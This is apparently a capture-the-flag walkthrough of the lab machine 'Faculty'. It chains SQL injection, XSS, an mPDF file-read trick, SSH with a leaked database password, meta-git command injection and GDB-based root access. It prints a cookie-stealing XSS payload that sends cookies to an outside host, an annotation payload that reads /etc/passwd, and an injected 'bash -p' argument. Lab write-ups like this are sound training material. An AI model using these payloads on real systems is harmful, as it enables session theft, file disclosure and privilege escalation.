# Faculty

![Faculty.png](Faculty/Faculty.png)

**Jul 2, 2022**

Login page on port 80

![Untitled](Faculty/Untitled.png)

This input has a SQL Injection vulnerability

Post request:

![Untitled](Faculty/Untitled%201.png)

File fuzzing on the application after login, using the cookie:

![Untitled](Faculty/Untitled%202.png)

There are some names in “faculty.php”.

![Untitled](Faculty/Untitled%203.png)

The admin page has a login input, we can try SQL Injection again:

![Untitled](Faculty/Untitled%204.png)

[https://www.cybersecuritywebtest.com/exploits-vulnerability/school~faculty~scheduling~system~1-48921](https://www.cybersecuritywebtest.com/exploits-vulnerability/school~faculty~scheduling~system~1-48921)

The XSS vulnerability on courses page can be applied:

![Untitled](Faculty/Untitled%205.png)

XSS trigged. 

![Untitled](Faculty/Untitled%206.png)

XSS cookie stealing.

```python
<img src=1 onerror=document.location="http://10.10.14.4/?"+document.cookie;>
```

![Untitled](Faculty/Untitled%207.png)

Dumping admin database with SQLMAP.

![Untitled](Faculty/Untitled%208.png)

Twitter mpdf report vulnerability

[https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f](https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f)

To explore just add a TAG to the POST request and set the extract file to download the data: The response is the generated file. 

![Untitled](Faculty/Untitled%209.png)

```jsx
<h1>aaaa</h1><annotation file="/etc/hosts" content=\"/etc/passwd\" icon=\"Graph\" title=\"Attached File: /etc/passwd\" pos-x=\"195\" /><h1>im here</h1>
```

Find the tag in PDF and click on the yellow mark:

![Untitled](Faculty/Untitled%2010.png)

This “passwd” was extracted from the PDF yellow mark.

![Untitled](Faculty/Untitled%2011.png)

Users on the machine:

![Untitled](Faculty/Untitled%2012.png)

The “db_connect.php” has a password of the MYSQL database, we can try use this password with one of users to login o the SSH

![Untitled](Faculty/Untitled%2013.png)

The login with “gbyolo” worked with success!

```jsx
$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
```

gbyolo SSH session:

![Untitled](Faculty/Untitled%2014.png)

To migrate to the user developer the “sudo -l” command leak some information that our user gbyolo can run commands as developer user, we found a hackerone report that we can run arbitrary command using the meta-git.

[https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)

![Untitled](Faculty/Untitled%2015.png)

The file was created as developer user.

![Untitled](Faculty/Untitled%2016.png)

After send the payload the developer user was spawned.

![Untitled](Faculty/Untitled%2017.png)

```jsx
sudo -u developer /usr/local/bin/meta-git clone 'sas||bash -p'
```

The user developer has an script that run with crontab.

![Untitled](Faculty/Untitled%2018.png)

### Root

There a GDB with debug permission.

![Untitled](Faculty/Untitled%2019.png)

We need to find a file running as root and try execute system commands:

![Untitled](Faculty/Untitled%2020.png)

Attach the GDB execution

```jsx
gdb attach PID
```

Now you just need to get a reverse shell or change the “/bin/bash” permission.

![Untitled](Faculty/Untitled%2021.png)